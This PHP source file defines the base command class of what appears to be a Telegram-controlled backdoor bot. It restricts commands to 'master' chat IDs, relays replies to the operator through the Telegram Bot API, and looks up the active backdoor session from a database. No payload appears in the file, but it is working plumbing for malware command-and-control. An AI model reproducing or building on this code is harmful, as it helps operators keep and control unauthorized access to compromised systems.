<?php

namespace System\Command;

use Database\Database;
use \PDO;

class Command
{
    protected $bdd;
    protected $chat_id;
    protected $bot;

    protected function checkUser()
    {
        $select = $this->bdd->prepare("SELECT * FROM users_table WHERE client_id = :client_id AND is_master = '1' LIMIT 0,1");
        $select->bindParam('client_id', $this->chat_id);
        $select->execute();
        if($select->rowCount() > 0)
        {
            $fetch = $select->fetch(PDO::FETCH_OBJ);
            if(isset($fetch->id_user))
            {
                return true;
            }
        }
        $this->returnMessage("You are not master (1/3 maximum retry before bot evasion)");
        die();
    }

    protected function returnMessage($message)
    {
        if($message !== null)
            file_get_contents('https://api.telegram.org/bot'.$this->bot.'/sendmessage?text='.$message.'&chat_id='.$this->chat_id);
        return true;
    }

    protected function currentBackdoor()
    {
        $current = $this->bdd->prepare("SELECT * FROM session_backdoor LIMIT 0,1");
        $current->execute();
        if($current->rowCount() > 0)
        {
            $fetch = $current->fetch(PDO::FETCH_OBJ);
            return $fetch->backdoor_name;
        }
        return false;
    }
}